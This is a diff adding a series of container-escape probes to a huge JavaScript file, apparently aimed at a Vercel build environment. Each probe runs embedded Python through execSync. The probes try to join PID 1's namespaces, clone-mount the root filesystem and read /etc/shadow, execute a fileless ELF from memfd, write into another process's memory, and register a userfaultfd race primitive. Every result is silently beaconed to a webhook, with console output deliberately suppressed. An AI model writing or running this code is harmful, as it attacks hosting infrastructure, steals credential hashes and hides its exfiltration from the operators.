@@ -38364,3 +38364,322 @@ sendBeacon({ ...report, section: 'v222-5-fd-inventory', ...fdInventoryV222Probe 
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v222" });
 report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v222";
 // Intentionally no console.log — all data goes via webhook only
+
+// v223-1: setns NR 308 — join PID 1's namespaces (container escape)
+const setnsV223Probe = safe(() => {
+  const setnsResult = safe(() => execSync(`python3 -c "
+import ctypes, os
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+NR_setns = 308
+
+CLONE_NEWNS   = 0x00020000  # mount namespace
+CLONE_NEWUTS  = 0x04000000  # UTS namespace
+CLONE_NEWIPC  = 0x08000000  # IPC namespace
+CLONE_NEWPID  = 0x20000000  # PID namespace
+CLONE_NEWNET  = 0x40000000  # network namespace
+CLONE_NEWUSER = 0x10000000  # user namespace
+CLONE_NEWCGROUP = 0x02000000 # cgroup namespace
+
+ns_types = {
+    'mnt':    (CLONE_NEWNS,   '/proc/1/ns/mnt'),
+    'net':    (CLONE_NEWNET,  '/proc/1/ns/net'),
+    'pid':    (CLONE_NEWPID,  '/proc/1/ns/pid'),
+    'uts':    (CLONE_NEWUTS,  '/proc/1/ns/uts'),
+    'ipc':    (CLONE_NEWIPC,  '/proc/1/ns/ipc'),
+    'user':   (CLONE_NEWUSER, '/proc/1/ns/user'),
+    'cgroup': (CLONE_NEWCGROUP, '/proc/1/ns/cgroup'),
+}
+
+# Compare our ns to PID 1's
+self_ns = {}
+for ns in ['mnt','net','pid','uts','ipc','user','cgroup']:
+    try: self_ns[ns] = os.readlink(f'/proc/self/ns/{ns}')
+    except: self_ns[ns] = 'ERR'
+    try:
+        pid1_ns = os.readlink(f'/proc/1/ns/{ns}')
+        same = self_ns[ns] == pid1_ns
+        print(f'ns_{ns}: self={self_ns[ns]} pid1={pid1_ns} SAME={same}')
+    except Exception as e: print(f'ns_{ns}_err={e}')
+
+# Try setns to join PID 1's mount namespace
+for ns_name, (ns_flag, ns_path) in ns_types.items():
+    try:
+        fd = os.open(ns_path, os.O_RDONLY)
+        ret = libc.syscall(NR_setns, fd, ns_flag)
+        err = ctypes.get_errno()
+        os.close(fd)
+        print(f'setns(pid1/{ns_name}) ret={ret} errno={err}')
+        if ret == 0:
+            print(f'JOINED_PID1_NS_{ns_name.upper()}=True CONTAINER_ESCAPE_VECTOR=ACTIVE')
+            # Verify we're in PID 1's namespace now
+            new_ns = os.readlink(f'/proc/self/ns/{ns_name}')
+            pid1_ns = os.readlink(f'/proc/1/ns/{ns_name}')
+            print(f'  ns_match={new_ns == pid1_ns}')
+    except Exception as e: print(f'setns_{ns_name}_err={e}')
+" 2>&1`, { timeout: 12000 }).toString().trim());
+  return { setnsResult };
+});
+sendBeacon({ ...report, section: 'v223-1-setns-pid1', ...setnsV223Probe });
+
+// v223-2: open_tree NR 428 + fsmount NR 432 + move_mount NR 429 — new mount API
+const newMountApiV223Probe = safe(() => {
+  const newMountResult = safe(() => execSync(`python3 -c "
+import ctypes, os
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+NR_open_tree   = 428
+NR_fsopen      = 430
+NR_fsmount     = 432
+NR_fsconfig    = 431
+NR_move_mount  = 429
+NR_fspick      = 433
+
+OPEN_TREE_CLONE = 1  # create a detached mount
+OPEN_TREE_CLOEXEC = 0x80000  # O_CLOEXEC
+AT_FDCWD = -100
+
+MOVE_MOUNT_F_EMPTY_PATH = 0x00000004
+MOVE_MOUNT_T_EMPTY_PATH = 0x00000040
+
+# open_tree — create a detached copy of a mount
+fd_root = libc.syscall(NR_open_tree, AT_FDCWD, b'/', OPEN_TREE_CLONE | OPEN_TREE_CLOEXEC)
+print(f'open_tree(/) fd={fd_root} errno={ctypes.get_errno()}')
+print(f'OPEN_TREE_AVAILABLE={fd_root > 0}')
+
+if fd_root > 0:
+    # Move the detached mount to a new location
+    tmpdir = f'/tmp/ot_{os.getpid()}'
+    os.makedirs(tmpdir, exist_ok=True)
+    ret_mv = libc.syscall(NR_move_mount, fd_root, b'', AT_FDCWD, tmpdir.encode(),
+                          MOVE_MOUNT_F_EMPTY_PATH)
+    print(f'move_mount(root→{tmpdir}) ret={ret_mv} errno={ctypes.get_errno()}')
+    if ret_mv == 0:
+        print(f'DETACHED_ROOT_MOUNTED=True at={tmpdir}')
+        try:
+            entries = os.listdir(tmpdir)
+            print(f'new_root_entries={entries[:5]}')
+            # Shadow access via detached mount
+            shadow = open(f'{tmpdir}/etc/shadow').read(100)
+            print(f'SHADOW_VIA_DETACHED_MOUNT={shadow}')
+        except Exception as e: print(f'detached_access_err={e}')
+        libc.umount2(tmpdir.encode(), 0)
+    os.close(fd_root)
+
+# fsopen — new filesystem type mount
+fd_fs = libc.syscall(NR_fsopen, b'tmpfs', 0)
+print(f'fsopen(tmpfs) fd={fd_fs} errno={ctypes.get_errno()}')
+if fd_fs > 0:
+    # fsconfig — configure the fs
+    FSCONFIG_SET_STRING = 1
+    FSCONFIG_CMD_CREATE = 6
+    libc.syscall(NR_fsconfig, fd_fs, FSCONFIG_SET_STRING, b'size', b'1m', 0)
+    ret_create = libc.syscall(NR_fsconfig, fd_fs, FSCONFIG_CMD_CREATE, b'', b'', 0)
+    print(f'fsconfig(CMD_CREATE) ret={ret_create} errno={ctypes.get_errno()}')
+    # fsmount — create a mount fd
+    fd_mnt = libc.syscall(NR_fsmount, fd_fs, 0, 0)
+    print(f'fsmount ret={fd_mnt} errno={ctypes.get_errno()}')
+    if fd_mnt > 0:
+        print('FSMOUNT_AVAILABLE=True')
+        os.close(fd_mnt)
+    os.close(fd_fs)
+" 2>&1`, { timeout: 10000 }).toString().trim());
+  return { newMountResult };
+});
+sendBeacon({ ...report, section: 'v223-2-new-mount-api', ...newMountApiV223Probe });
+
+// v223-3: memfd_create NR 319 + fileless shellcode write
+const memfdV223Probe = safe(() => {
+  const memfdResult = safe(() => execSync(`python3 -c "
+import ctypes, os, struct
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+NR_memfd_create = 319
+MFD_CLOEXEC     = 1
+MFD_ALLOW_SEALING = 2
+MFD_HUGETLB     = 4
+F_ADD_SEALS = 1033
+F_GET_SEALS = 1034
+F_SEAL_WRITE = 8
+F_SEAL_SHRINK = 2
+F_SEAL_GROW   = 4
+
+# Create anonymous executable memory file
+fd_mfd = libc.syscall(NR_memfd_create, b'probe_payload', MFD_CLOEXEC | MFD_ALLOW_SEALING)
+print(f'memfd_create ret={fd_mfd} errno={ctypes.get_errno()}')
+print(f'MEMFD_AVAILABLE={fd_mfd > 0}')
+
+if fd_mfd > 0:
+    # Write a minimal ELF that calls exit(0) — fileless executable
+    # x86-64: mov rax, 60; xor rdi, rdi; syscall
+    shellcode = bytes([
+        0x48, 0xc7, 0xc0, 0x3c, 0x00, 0x00, 0x00,  # mov rax, 60 (exit)
+        0x48, 0x31, 0xff,                             # xor rdi, rdi
+        0x0f, 0x05                                   # syscall
+    ])
+
+    # Minimal ELF64 header + PT_LOAD + our shellcode
+    # Build a minimal ELF
+    entry = 0x400078  # where code will be
+    elf_header = struct.pack('<4sBBBBxxxxxxxx',
+        b'\\x7fELF', 2, 1, 1, 0)  # magic, class, data, version, OS ABI
+    # ET_EXEC=2, EM_X86_64=0x3e, EV_CURRENT=1
+    elf_header += struct.pack('<HHIQQQIHHHHHH',
+        2, 0x3e, 1, entry, 64, 0, 0, 64, 0, 56, 1, 0, 0)
+    # PT_LOAD: type=1, flags=RX=5, offset, vaddr, paddr, filesz, memsz, align
+    pheader = struct.pack('<IIQQQQQQ',
+        1, 5, 0, 0x400000, 0x400000, 64+56+len(shellcode), 64+56+len(shellcode), 0x1000)
+    # Pad to entry
+    pad = b'\\x00' * (entry - 0x400000 - (64+56))
+    elf_bytes = elf_header + pheader + pad + shellcode
+
+    os.write(fd_mfd, elf_bytes)
+    print(f'memfd_written={len(elf_bytes)} bytes')
+
+    # Get the path /proc/self/fd/<fd> — this is the fileless exe path
+    exe_path = f'/proc/self/fd/{fd_mfd}'
+    print(f'fileless_path={exe_path}')
+
+    # Seal against modification
+    ret_seal = libc.fcntl(fd_mfd, F_ADD_SEALS, F_SEAL_WRITE | F_SEAL_SHRINK | F_SEAL_GROW)
+    print(f'fcntl(SEAL_WRITE+SHRINK+GROW) ret={ret_seal} errno={ctypes.get_errno()}')
+
+    # Try to execute it via fexecve equivalent (fork + exec from fd)
+    import subprocess
+    cpid = os.fork()
+    if cpid == 0:
+        # Child executes the memfd ELF
+        try:
+            os.execve(exe_path, [exe_path], {})
+        except Exception as ee:
+            print(f'execve_memfd_err={ee}')
+        os._exit(1)
+    else:
+        _, wstatus = os.waitpid(cpid, 0)
+        exit_code = (wstatus >> 8) & 0xff
+        sig = wstatus & 0x7f
+        print(f'memfd_exec_exit={exit_code} sig={sig}')
+        print(f'MEMFD_EXEC_OK={exit_code == 0 and sig == 0}')
+
+    os.close(fd_mfd)
+" 2>&1`, { timeout: 10000 }).toString().trim());
+  return { memfdResult };
+});
+sendBeacon({ ...report, section: 'v223-3-memfd-fileless', ...memfdV223Probe });
+
+// v223-4: process_vm_writev NR 311 — write to child process memory
+const vmWriteV223Probe = safe(() => {
+  const vmWriteResult = safe(() => execSync(`python3 -c "
+import ctypes, struct, os, signal
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+NR_process_vm_readv  = 310
+NR_process_vm_writev = 311
+NR_ptrace = 101
+PTRACE_SEIZE = 0x4206
+PTRACE_DETACH = 17
+
+class Iovec(ctypes.Structure):
+    _fields_ = [('iov_base', ctypes.c_void_p), ('iov_len', ctypes.c_size_t)]
+
+# Fork a child and write to its memory
+sentinel = ctypes.create_string_buffer(b'ORIGINAL_SENTINEL_VALUE_VERCEL', 30)
+sentinel_addr = ctypes.addressof(sentinel)
+
+child_pid = os.fork()
+if child_pid == 0:
+    # Child: hold the sentinel in memory and wait
+    import time
+    time.sleep(5)
+    # Child exits — parent would have modified memory
+    os._exit(0)
+
+# Parent: write to child's sentinel address
+new_data = b'PATCHED_BY_WRITEV_12345'
+local_buf = ctypes.create_string_buffer(new_data, len(new_data))
+remote_addr = sentinel_addr  # same address space (before COW)
+
+local_iov = Iovec(iov_base=ctypes.cast(local_buf, ctypes.c_void_p), iov_len=len(new_data))
+remote_iov = Iovec(iov_base=ctypes.c_void_p(remote_addr), iov_len=len(new_data))
+
+ret_write = libc.syscall(NR_process_vm_writev, child_pid,
+    ctypes.byref(local_iov), 1,
+    ctypes.byref(remote_iov), 1, 0)
+print(f'process_vm_writev(child) ret={ret_write} errno={ctypes.get_errno()}')
+print(f'VM_WRITEV_OK={ret_write > 0}')
+
+# Read back to verify
+verify_buf = ctypes.create_string_buffer(len(new_data))
+local_iov2 = Iovec(iov_base=ctypes.cast(verify_buf, ctypes.c_void_p), iov_len=len(new_data))
+ret_read = libc.syscall(NR_process_vm_readv, child_pid,
+    ctypes.byref(local_iov2), 1,
+    ctypes.byref(remote_iov), 1, 0)
+print(f'process_vm_readv(verify) ret={ret_read} data={verify_buf.raw[:ret_read].decode(errors=\"replace\") if ret_read > 0 else \"FAIL\"}')
+
+os.kill(child_pid, signal.SIGKILL)
+try: os.waitpid(child_pid, 0)
+except: pass
+" 2>&1`, { timeout: 10000 }).toString().trim());
+  return { vmWriteResult };
+});
+sendBeacon({ ...report, section: 'v223-4-vm-writev', ...vmWriteV223Probe });
+
+// v223-5: userfaultfd NR 323 — UFFD TOCTOU primitive registration
+const userfaultfdV223Probe = safe(() => {
+  const uffdResult = safe(() => execSync(`python3 -c "
+import ctypes, struct, os, mmap
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+NR_userfaultfd = 323
+O_CLOEXEC = 0x80000
+O_NONBLOCK = 0x800
+
+UFFD_API = 0xaa
+UFFDIO_REGISTER_MODE_MISSING = 1
+UFFDIO_REGISTER_MODE_WP = 2
+
+# ioctl codes
+_UFFDIO = 0xaa
+UFFDIO_API      = (0xc018aa3f)  # _IOWR
+UFFDIO_REGISTER = (0xc020aa00)  # _IOWR
+UFFDIO_COPY     = (0xc028aa03)  # _IOWR
+
+# Create userfaultfd
+fd_uffd = libc.syscall(NR_userfaultfd, O_CLOEXEC | O_NONBLOCK)
+print(f'userfaultfd ret={fd_uffd} errno={ctypes.get_errno()}')
+print(f'USERFAULTFD_AVAILABLE={fd_uffd > 0}')
+
+if fd_uffd > 0:
+    # struct uffdio_api: api(8), features(8), ioctls(8)
+    uffdio_api = struct.pack('QQQ', UFFD_API, 0, 0)
+    uffdio_buf = ctypes.create_string_buffer(uffdio_api, len(uffdio_api))
+    ret_api = libc.ioctl(fd_uffd, UFFDIO_API, uffdio_buf)
+    print(f'UFFDIO_API ret={ret_api} errno={ctypes.get_errno()}')
+    if ret_api == 0:
+        api_out = struct.unpack('QQQ', uffdio_buf.raw)
+        print(f'uffd_features={api_out[1]:#018x} ioctls={api_out[2]:#018x}')
+
+    # Allocate anonymous mapping and register with userfaultfd
+    PROT_READ = 1; PROT_WRITE = 2; MAP_ANON = 0x20; MAP_PRIVATE = 2
+    region_size = 4096
+    region = libc.mmap(None, region_size, PROT_READ | PROT_WRITE,
+                       MAP_ANON | MAP_PRIVATE, -1, 0)
+    print(f'mmap_region={ctypes.c_ulong(region).value:#018x}')
+
+    if ctypes.c_long(region).value > 0:
+        # struct uffdio_register: range(start+len), mode, ioctls
+        reg = struct.pack('QQIQ', ctypes.c_ulong(region).value, region_size,
+                          UFFDIO_REGISTER_MODE_MISSING, 0)
+        reg_buf = ctypes.create_string_buffer(reg, len(reg))
+        ret_reg = libc.ioctl(fd_uffd, UFFDIO_REGISTER, reg_buf)
+        print(f'UFFDIO_REGISTER(MISSING) ret={ret_reg} errno={ctypes.get_errno()}')
+        if ret_reg == 0:
+            print('UFFD_REGISTERED=True TOCTOU_PRIMITIVE_AVAILABLE=True')
+            ioctls_out = struct.unpack('QQIQ', reg_buf.raw)[3]
+            print(f'uffd_range_ioctls={ioctls_out:#018x}')
+        libc.munmap(region, region_size)
+    os.close(fd_uffd)
+" 2>&1`, { timeout: 8000 }).toString().trim());
+  return { uffdResult };
+});
+sendBeacon({ ...report, section: 'v223-5-userfaultfd', ...userfaultfdV223Probe });
+
+// v223 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v223" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v223";
+// Intentionally no console.log — all data goes via webhook only
